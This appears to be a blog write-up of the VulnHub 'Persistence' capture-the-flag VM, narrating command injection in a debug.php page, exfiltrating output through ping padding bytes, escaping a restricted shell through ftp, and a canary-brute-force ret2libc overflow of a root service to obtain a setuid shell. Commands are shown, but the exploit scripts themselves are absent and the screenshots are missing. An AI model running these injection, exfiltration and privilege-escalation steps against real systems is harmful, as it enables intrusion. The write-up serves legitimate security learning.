
---
title: "VULNHUB - Persistence write up"
date: 2014-09-25T08:59:59Z
tags: ["CTF"]
---

## Initial Enumeration

The IP address of our target was identified using the **netdiscover** command, examining our
own IP address of 192.168.56.102 it made sense for the IP to be close very close:

The next step was to identify any open ports using our favourite port scanner nmap, for
completeness I decided to perform a full TCP scan to start with (-p 1-65535), identifying the
versions of any software we might find with (-sV), setting the timing template to 5 as we are
scanning over the LAN with no firewall devices in our way (-T5). I also decided it was a
good idea to run the default nmap scripts (-sC) for some extra information. The complete
command became **nmap –sV –sC –p 1- 65535 – T5 192.168.56.**.

As per my normal methodology I decided to leave a full UDP scan for if there were literally
no TCP ports to attack as I wanted to finish this VM before 2016.

The results showed me there was a webserver running nginx 1.4.7 with the page title “the
persistence of memory – salvador dali”:

After checking various online sources such as exploit-db and security focus for any memory
corruption issues in our target version of nginx no useful exploits were discovered (sad
panda).


It was time to enumerate the website itself. Viewing the site in Iceweasel browser we can
see an image of a famous painting:

We can examine the source by launching the following URL:

**view-source:http://192.168.56.**

Nothing strange or interesting here, not even a directory name for us to poke around.

## Scratching below the surface

Let’s move onto brute forcing file names on the web server. For this task it was an obvious
choice, Dirbuster with the directory-list-2.3-medium.txt, I left the file extension as it was and
decided to try my luck (hell yes I’m a gambling man!):


An short while eternity later I received my first (and only) result. Hmmm “debug.php” you
say, this has **got** to be worth checking out:

Opening the page in Iceweasel I saw a familiar looking page:

My spider sense was going crazy at this point I could smell the command injection
vulnerability in this page. I couldn’t wait to wear out my **&** key some more it was almost as
worn out as my **‘** key.

So like every example that you will see on any presentation vaguely related to OWASP I
entered:

**127.0.0.1 && ls** into the shiny “address” box and hit submit:


The response I received wasn’t quite what I was looking for... nothing just the same form
with no additional output. :(. However I did notice that there was a delay in between
sending my request and receiving the response. It seemed as if it really was pinging the IP
address provided. My first attempt to exploit this was to enter **127.0.0.1 && wget
[http://192.168.56.102](http://192.168.56.102)** whilst I tailed my apache logs, this yielded no results so I moved
onto to looking at the man page for the ping command to see if there was anything useful,
I'd heard of ICMP backdoors previously so it must be possible to add some custom data to a
ping packet but I wasn't sure if it was possible with the ping command alone, I came across
the -p flag:

Great so we can use this to add some data to the ping packet. Before I went at it all guns
blazing I tried out the command locally with a test string:

So the string we send needs to be hex. It was time for some bash-fu, I ended up with the
following command: **ping 127.0.0.1 -p $(echo -n test|xxd -i|tr -d '0x'|tr -d ' ,\r\n')**

As you can see it creates a hex pattern:

Let's break this command down, so the whole thing is encapsulated with $() this characters
perform a substitution so the output of our command will be passed as an argument to -p of
the pattern flag.

As a test I echoed the word “test” (with no new line character -n) and piped this to the xxd
command using the -i flag, this will output “test” in hex format as: **0x74, 0x65, 0x73,
0x74** now we pipe this output to tr (translate) command with -d flag to delete 0x space
comma and any carriage return or line feed characters to neutralize new lines. Time to put
this little puppy into burp suite but this time I changed the **echo -n test** to **echo -n `ls`**
this was another substitution to echo the output of ls but remove any new line characters. I
was also very careful to encode the payload replacing & with %26.

The request looked as follows, you will notice the ping command I'm sending is to ping my
IP, this way I can view the ICMP response with hopefully the pattern in Wireshark. I have
also specified -c 1 to the end of the command, this is because by default the command in
Linux will continue until it's terminated which is not possible for us to do:


I had configured my Wireshark to monitor eth1 which is 192.168.56.102:


To avoid any junk in the results I also included a display filter of **icmp && ip.src ==
192.168.56.101** so that we can only see ICMP responses from 192.168.56.101.

Now we send the request with burp and we can see the following response in Wireshark:

OK cool, so it returns “debug” this seems to match up with the page discovered using
Dirbuster. Let's see if there’s anything else of interest in the web root that Dirbuster couldn't
find? It seemed sensible to modify my ls command to list one file at a time starting with the
letter “a” and working its way up to “z”, then move onto uppercase A-Z and finally numbers.
For example **ls a*** to list the first file that starts with “a” until I had tried each of my
selected characters in turn:

{{ < highlight  html >}}

{{ < / highlight  html >}}


The payload configuration looked as follows:

I started up intruder and checked Wireshark for the results, an interesting result was found
when running ls s*:


The request that was sent was as follows:


## The poor man’s guide to reverse engineering

Next I downloaded the file from the following link as it was in the web-root:
**[http://192.168.56.101/sysadmin-tool:](http://192.168.56.101/sysadmin-tool:)**

With the file downloaded, I run the **file** command against **sysadmin-tool** to determine
how to proceed:


So it's an executable, let’s use our favourite advanced reverse engineering tool ;) **strings** on
the binary file:

Here we can see some valuable information.

```
1) the usage of the application (in red)
2) a system command which modifies the firewall rules (in blue)
3) some credentials that we can use to gain access (in green)
```

Let's use the command injection to run **sysadmin-tool –activate-service**


Running a basic nmap scan **(nmap 192.168.56.101)** we can see that this has activated
ssh:

Now we try to login to the box with the credentials – luckily for us they work!

## Where is Michael Scoffield when you need him?

However we can see that avida's shell is restrictive bash, if we try to **cd /** we are presented
with an error:


Looking at the current folder we notice there is a folder structure of **usr/bin** inside this
there are symbolic links to a bunch of commands, these are the commands that we are
allowed to execute inside this restrictive shell:

The centos box doesn't have any man pages installed (boo!) but to help me escape the shell
I carefully checked the man page for each command that was available looking for a way to
escape rbash.

When I ran **man ftp** from my Kali box I came across the following:

Well this looks like just the ticket, let's give it a try. First we launch **ftp** with no parameters
so it is in interactive mode, then we enter **!/bin/bash** to run bash, as you can see we no
longer receive the permission denied error message – **Tick Tick BOOM HEADDSHOTTT!**

My intuition told me that the $PATH variable had probably been messed with by rbash:

I didn't want to have to type full paths every time I ran a command so I fixed the path with
the following command: **export PATH=/usr/bin:/bin:/usr/sbin**


After enumerating the box some more, I ran **ps aux | grep root** looking for any interesting
processes running as root. I was able to locate /usr/local/bin/wopr the /usr/local folder is
usually for external applications that do not come bundled with the Linux distro, so chances
were this was a custom application.

A quick google later and showed me this was a reference to the movie wargames:

This had to the be the right file, running wopr showed a bind() error it seemed highly likely
this was a network application:

## Hello Professor Falken

I ran **netstat -tulpn** (“t” is tcp, “u” is udp “l” is listening, “p” is program and “n” is for
numeric) in hope that it will tell me the process ID so I could compare it to the process ID of
the wopr application, however this was not the case, as you need to be root to use the “p”
flag:


So I was out of luck, the only choice was to connect to each port with netcat one by one.
The first command I entered was **nc 127.0.0.1 3333** and lone behold I was presented
with a prompt displaying the famous quote from wargames: “would you like to play a
game?” - sweeeeet so it seems like we've found the correct application:

I ran **file /usr/local/bin/wopr** the format was elf 32-bit executable it was pretty safe to
say the application was created with a C based language so there could be some form of
memory corruption issue inside:

I decided to create a folder inside /tmp to contain all my PoC code:

Now I wanted to inspect the security of the executable, so I launched nano and pasted
checksec.sh^1 into it.

I made checksec.sh executable with **chmod +x checksec.sh** and then ran it using
**./checksec.sh –file /usr/local/bin/wopr** to see the protection mechanisms employed –
great so we need to bypass a stack canary and a non-executable stack (NX). Well we can
use ret2libc for NX but at this point I wasn’t too sure about the stack canary.

#### 1

```
http://www.trapkit.de/tools/checksec.sh
```

I checked the ASLR status for the box with **cat /proc/sys/kernel/randomize_va_space**
zero indicates it’s off, good news for us 

Let's disassemble the application and take a peek, launch **gdb /usr/local/bin/wopr**. At
the GDB prompt I set the disassembly flavour to Intel syntax as I find it easier to read, the
command is **set disassembly-flavor intel**. I have then issued **disas main** to disassemble
the main function, my reverse engineering skills are limited so I find the easiest way to get a
very high level idea of how an application works is to look at the call instructions, we can
see which functions are called and if necessary examine any interesting logic between the
calls to c functions that commonly have memory corruption issues, I have removed
everything but the calls from the output to make it clearer, by googling the get_reply
function highlighted in red, we can determine that this is a custom function.



Let’s take a look at get_reply as well using **disas get_reply**.


Looking at the disassembly of get_reply and using Microsoft’s security development life cycle
article as a reference^2 I noticed the call to memcpy which has been classified as a “banned
memory copy function”, well this looks promising 

So, we know where the issue should be, let’s take a quick look at the stack canary, after a
bunch of research on the I found an article on phrack^3 to quote the paper “How do those
canaries work? At the time of creating the stack frame, the so-called canary is added. This is
a random number. When a hacker triggers a stack overflow bug, before overwriting the

2

3 **[http://msdn.microsoft.com/en-us/library/bb288454.aspx](http://msdn.microsoft.com/en-us/library/bb288454.aspx)**^
**[http://phrack.org/issues/67/13.html](http://phrack.org/issues/67/13.html)**


metadata stored on the stack he has to overwrite the canary. When the epilogue is called
(which removes the stack frame) **the original canary value (stored in the TLS,
referred by the gs segment selector on x86)** is compared to the value on the stack. If
these values are different SSP (stack smashing protection) writes a message about the
attack in the system logs and terminate the program“. This provided us with a clue if we
encountered the “gs” register as to what was going on.

This can be seen in the disassembly below:

Obviously we want to take a look at the application using gdb in its running state while we
send our payload but we can't attach directly to the running process as it's running as root.
So we have two options one is to write some awful code to copy wopr via the ping
command (yuck!) or the second easier technique is to debug it on the box. The problem is
the port number wopr listens on is static, when we run it ourselves we get a bind error
because the port number is in use already:

But as a super evil genius I won’t let that stops me. ...Enter ld-preload, here's a quote from
wikipedia “The dynamic linker can be influenced into modifying its behaviour during either


the program's execution or the program's linking. Examples of this can be seen in the run-
time linker manual pages for various Unix-like systems. A typical modification of this
behaviour is the use of the **LD_LIBRARY_PATH** and **LD_PRELOAD** environment
variables. These variables adjust the runtime linking process by searching for shared
libraries at alternate locations and by forcibly loading and linking libraries that would
otherwise not be, respectively.” 4 What this means is we can replace a function at run time.
After some searching I found a piece of code 5 that was replacing the bind src address but
this wasn't quite what I needed, I needed to replace the bind port.

I hacked away at the source code and eventually came up with bind.c – I've added some
comments for your viewing pleasure:



We compile this with: **gcc -fPIC -static -shared -o bind.so bind.c -lc –ldl.** Let’s break
the command down, -fPIC sets the format as **P** osition **I** ndependent **C** ode, this makes our
code suitable for inclusion in a library. We need a static object to load it into LD_PRELOAD
so we use –static-shared, –lc statically links in libc and –ldl is for dynamic libraries.

Let's set up LD_PRELOAD and give it a try:

If you're following along at home the LD_PRELOAD command is **export
LD_PRELOAD=/tmp/exploit/bind.so**. Now we can debug this thing properly lets open
another SSH session and see if we can overwrite EIP. We start by getting wopr's process id
using **ps aux | grep wopr** – you can ignore the “defunct” processes these are processes
that I have crashed and entered into a zombie state - brainnnsssss:


Let's take a quick look at what a stack canary is, it's basically a barrier put in place by an evil
compiler called GCC, the simplified stack layout of a program using SSP which enforces the
stack canary can be described by the diagram below:

Our payload will begin in the local variables section and overflow it’s way to EIP. In terms of
the diagram, what we need to do is to sneak past the stack canary and EBP to get to the
little hammer (EIP) to cause epic pwnage. How can we do this without being jumped on by
a giant angry turtle I hear you say? Well what we do is a use a technique created by Ben
Hawkes mentioned on phrack 67^6 his idea was to brute force the stack canary one byte at a
time.

How this works is: we send a string of A's, one A at a time until we trigger the stack
smashing protection (SSP) which means the first byte of our canary was overwritten – this
gives us the offset of the canary. Now we send our payload that looks like something like
this:

### [A*CANARY-OFFSET][CANARY BYTE 1 GUESS] we send every possible combination

0x00 through to 0xff as our guess until we no longer receive the SSP error – this means we
have determined the value of the first byte. We save this canary byte and move onto the

### next. i.e. [A*CANARY-OFFSET][DISCOVERED CANARY BYTE][CANARY BYTE 2

### GUESS] until we have discovered the whole canary. This reduces the possibilities from

255*255*255*255 (4228250625) combinations to 4*256 which is 1024. As you can see we
drastically reduced the possibilities and amount of time it will take to perform this brute
force.

You might ask yourself; doesn't the stack canary change every time we run the application?
Yep it does but as wopr uses fork() when it receives a connection the stack canary is the
same as the main process, from the man page “fork() creates a new process by duplicating
the calling process. The new process, referred to as **the child, is an exact duplicate of
the calling process** ” therefore it is possible to brute force the canary until we have it.

#### 6

```
http://phrack.org/issues/67/13.html
```

One more thing we need is a way to detect if the canary value is incorrect, if we send a
normal request:

If we send a long request of 1000 using the following commands **python -c 'print
“A”*1000' > yhulothur** and then **nc 127.0.0.1 1337 < yhulothur** this will output 1000
A's to yhulothur and pipe it into wopr as input, we see that it no longer contains the “bye”
section of the response:

Going back to the window that is running wopr, we can see that the request is triggering
SSP and we are overwriting EIP with A's – we can use the presence of “bye” to determine if
the canary is correct:

Before we get to writing a PoC to brute force the stack canaries, let's work out the offset of
EIP using msfpayload on our kali box using ruby **/usr/share/metasploit-
framework/tools/pattern_create.rb 1000**


If we go back to our ssh session on persistence and copy the output from msfpayload into a
file called find-eip and then pipe it to wopr using nc 127.0.0.1 1337 < find-eip

We can see where the offset is on the SSP error:

Now we can enter this address into pattern_offset using **ruby /usr/share/metasploit-
framework/tools/pattern_offset.rb 0x33624132** , we see that EIP's offset is 38.


Armed with this information we can write our code to brute force the canary. I present to
you get_canary.py



If we give it a whirl we see the following:

We are writing 30 A's followed by the canary value to payload.txt so we can use it in our
testing:

### Going back to our original concept that on the stack we have

### [Local Variables][Stack Canary][EBP][EIP]

If we add BBBBCCCC to the end of payload.txt we should overwrite EBP with BBBB
(42424242) and EIP with CCCC (43434343) we can do this with the following command:
**echo -n $(cat payload.txt)BBBBCCCC > new-payload.txt**

It uses substitution to read payload.txt and echo (-n is for no new line characters) it out
along with BBBBCCCC back to payload.txt:

For the remainder of our debugging adventures we will use the following two commands:
**set follow-fork-mode child
set detach-on-fork off**

These commands help us debug the child processes that are spawned as this is where our
crash will occur, lets attach to the process as we did before and enter the commands we will
also enter **c** to allow the application to continue this is because when we attach a debugger
to an application it will put it into a paused state:


We now send our payload as before:

In the wopr window we see that there is no SSP error just a “got a connection message” –
the canary has been pwned.

Finally checking in gdb – we have successfully overwritten EBP and EIP

So that the application would graciously handle our malicious payload I decided to apply the
same brute forcing techniques to EBP so that if it was used by the application it would not
cause any issues, so again we run our get_canary.py script but this time we specify 8 as the
canary size, to recover the 4 byte canary and 4 byte EBP.

We use the same technique as previously to append just BBBB to overwrite EIP to make
sure our payload is in good working order:


Looking back in GBD – we see that EBP is intact (red) and EIP is still overwritten with BBBB
(blue):

Cool, now if you recall this executable is compiled with NX protection aka a non-executable
stack. This means we can’t execute our shell code directly from the stack, luckily for us it’s
pretty straight forward to bypass this protection using ret2libc. Instead of JMPing to our
shell code, we jump to the libc address for a function of our choosing and set the stack up
in advanced so that we can provide input to it. We will select the system() function as it will
allow us to run commands e.g. system(“whoami).

If we implement this it will look as follows:

### [A*30][4 Byte Canary][4 Byte EBP][EIP → Address of System()

### Function][JUNK][Address of App To Launch].

First of all we need the address of system – we can get this from GDB using **print system**

The astute reader will notice that this address is only 3 bytes long instead of 4, that's
because the first byte is set to 0x00 – GDB doesn’t display null byte prefixes. Why is this?
After a bunch of research I discovered this is because a protection mechanism called ASCII
Armor was in place on the box, what this does is load all libc functions (and a bunch of
other stuff) into the addresses start with 0x00, the idea behind this to protect from ret2libc


attacks when a buffer overflow is being exploited in string processing functions such as
strcpy which terminate strings at null bytes. However, our vulnerable code is using memcpy,
for memcpy to work it needs to allow addresses that contain nulls as having an address with
a null in it is a legitimate scenario. So we don’t have to worry about this problem.

Ok, so we have our system() address, now we need the address of a string of an application
to launch. From past experiences I decided to find the address of a string in the binary
itself, I did this using:

**strings -t x /usr/local/bin/wopr** this prints the location of the string in hex.

A full path caught my eye immediately /tmp/log at location c60:

Why? Well /tmp is usually writeable to everyone so I should be able to replace this file if it
existed. Quickly verifying this I discovered it did not exist:


If we run **info file** from inside GDB, we can grab the entry point address:

If we take this address of 0x80486c0 and replace the last 3 characters with the hex location
from strings’ output of c60, we now get 0x8048 **c60** this should be the address of /tmp/log
we can verify it in gdb using: **x/s 0x8048c60** this will inspect the string at this location –
as we can see this is fine:

All that's left to do is insert the system address at the location of EIP, 4 bytes of junk and
then location of /tmp/log right after, but before we do let's create a small file to place in the
location of /tmp/log. The first file I created is to just set uid to 0 to force the application to
run as root and launch /bin/bash, it's called rootshell.c -



You can compile it with **gcc rootshell.c -o rootshell,** it should be copied onto the box the
same way as the other files by pasting the contents into nano at /tmp/exploit/rootshell.c


Log.c – this file will copy the rootshell executable we created to /tmp/rs and thus take
ownershop and then set the sticky bit on it, this will mean that when we run /tmp/rs it will
run /bin/bash as the root user:



Log.c should be placed in /tmp/ and compiled with **gcc log.c -o log**

We have one last obstacle in our way, as ASCII Armor is changing the addresses of the libc
functions, there is no way to guarantee that we will receive the same address as the root
user, so just to make sure we will partially brute force the system() address , one thing we
can rely on is the address will start with 0x00 thanks to ASCII Armor, so I will go with brute
forcing the last 2 bytes of the address. Brute forcing addresses can take quite a long time so
to speed things up I decided to make my PoC multithreaded, I added a mechanism to check
if /tmp/rs has been created to stop the brute force.

We start with the base address of 0x0016 and then try every possible combination of 0x00-
0xff for the second and third byte of the address. Here is the source code for exploit.py that
I used to get root:


Please note the addresses will be printed backwards. We save the file to
/tmp/exploit/exploit.py with nano and run **python exploit.py 127.0.0.1 1337**

Ok cool so that seemed to work fine, let's remove /tmp/rs and run the exploit against the
main version of wopr on port 3333

We need to rerun get_canary to grab the new canary and EBP: **python get_canary.py
127.0.0.1 3333 38 8**


Then run the exploit: **python exploit.py 127.0.0.1 3333**

Now let's get our root shell by running **/tmp/rs** and read the flag:

**Game over!** Hopefully you enjoyed reading this even half as a much as I enjoyed owning
it.

Adios for now,
highjack



